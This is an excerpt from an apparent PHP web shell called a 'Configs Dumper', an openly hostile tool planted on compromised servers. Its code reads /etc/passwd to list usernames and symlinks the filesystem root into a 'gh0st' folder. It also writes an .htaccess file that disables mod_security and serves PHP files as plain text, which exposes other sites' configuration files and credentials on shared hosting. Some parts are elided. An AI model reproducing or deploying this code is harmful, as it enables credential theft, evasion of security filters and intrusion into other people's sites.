...
<title>3xpl01t_Ma Configs Dumper</title>
<p align="center"> 
<img border="0" src="https://s32.postimg.org/npb7183l1/image.jpg"></p>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<body background="http://www.convergence-creators.siemens.com/bundles/cms/img/header-default/404.gif">

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
<td width="100%" align=center valign="top" rowspan="1">
<center><font color="green" size="6" face="impact">Configs Auto Dumpper</center></font>
<div class="hedr"> 
...
echo '<center>
<form method=post><font color=white size=2 face="comic sans ms">Usernames Dump</font><p>
...
echo '<form method=post><textarea rows=10 cols=50 name=user><?php  $users=file("/etc/passwd");';
...
echo '</textarea><br><br><input type=submit name=su value="Extract Them Now" /></form>';
...
$g = fopen('gh0st/.htaccess','w');
fwrite($g,$rr);
$Sym = symlink("/","gh0st/root");
$rt="<a href=gh0st/root><font color=green size=5 face=\"impact\"> r00t</font></a>";
echo "<br><u>$rt</u>";

$dir=mkdir('gh0st',0777);
$r  = "OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
$f = fopen('gh0st/.htaccess','w');
   
fwrite($f,$r);
$gh0stsym="<a href=gh0st/><font color=green size=5 face=\"impact\">configuration files</font></a>";
echo "<br><br><u><font color=red size=2 face=\"comic sans ms\">$gh0stsym</font></u>";
